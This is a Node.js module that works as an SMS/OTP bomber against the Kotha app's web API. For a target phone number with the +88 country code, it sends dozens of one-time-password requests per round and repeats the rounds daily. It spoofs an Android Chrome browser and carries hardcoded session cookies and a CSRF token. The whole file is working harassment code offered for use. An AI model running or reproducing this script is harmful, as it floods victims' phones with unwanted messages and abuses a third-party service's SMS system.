const axios = require("axios");

async function kotha(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const { data } = await axios.post(
  'https://web.kotha.app/api/otp-auth',
  {
    'number': `+88${number}`,
    'retryAttempt': 0
  },
  {
    headers: {
      'authority': 'web.kotha.app',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga=GA1.1.875733277.1750760835; _gcl_au=1.1.1095184874.1750760848; AWSALBCORS=BnWk0XjLjLl+1kKWqjAQHKom4dOTJkTpW0WnQJKP2Qt74cnA90WG/Vo+20UKyVqTlRNr4fGg3unp4wixSpU1mDQZvHXXVDNVYa8WYcMUoRKxSE3U8Y/H18pvjIHQ; _ga_5Q0583973Z=GS2.1.s1750835786$o2$g0$t1750835786$j60$l0$h0; __Host-next-auth.csrf-token=e94359f9a5dc1bb1b4b41f16576244267238e534a89d94c95bb14b294fd286de%7Cc841a6f2ee0f9fa959f1c022352d34889b70879772b34de0151c3f52526c6d6f; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750835791$o2$g0$t1750835797$j54$l0$h1480993924; AWSALB=OIz0dKK0Nf+nLiXwnuMto8X9h6yqeKqFwyTZmWhjD6TDIB1+HIqNiA27Q1zDxzhmtfxf4sNedd5cp8jqTjolXTB72eV0U1z7sCVDmvwBjEXrxqp0p68dMNZj229u',
      'origin': 'https://web.kotha.app',
      'referer': 'https://web.kotha.app/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);

const response = await axios.post(
  'https://web.kotha.app/api/otp',
  {
    'number': `+88${number}`,
    'retryAttempt': 0,
    'deviceToken': data.deviceToken,
    'deviceId': data.deviceId
  },
  {
    headers: {
      'authority': 'web.kotha.app',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/json',
      'cookie': '_fbp=fb.1.1750760831908.836421696327277018; _ga=GA1.1.875733277.1750760835; _gcl_au=1.1.1095184874.1750760848; AWSALBCORS=BnWk0XjLjLl+1kKWqjAQHKom4dOTJkTpW0WnQJKP2Qt74cnA90WG/Vo+20UKyVqTlRNr4fGg3unp4wixSpU1mDQZvHXXVDNVYa8WYcMUoRKxSE3U8Y/H18pvjIHQ; _ga_5Q0583973Z=GS2.1.s1750835786$o2$g0$t1750835786$j60$l0$h0; __Host-next-auth.csrf-token=e94359f9a5dc1bb1b4b41f16576244267238e534a89d94c95bb14b294fd286de%7Cc841a6f2ee0f9fa959f1c022352d34889b70879772b34de0151c3f52526c6d6f; __Secure-next-auth.callback-url=https%3A%2F%2Fweb.kotha.app%2F; _ga_F1NTDB2MG2=GS2.1.s1750835791$o2$g1$t1750836037$j45$l0$h1480993924; AWSALB=fHL0s0SzRT7JKJbmRt4TLBSeYWh+SUpLPqm3zuu1GQTkoFAlIp70F7sSgCyk9J1yxWEegtYfUSe0LSmQDWmr8SXRL27GVKFiuKeCfaA9MFo4uyhIAIAwLKOmhUEU',
      'origin': 'https://web.kotha.app',
      'referer': 'https://web.kotha.app/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
  }
);
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 24 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 86400000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { kotha };
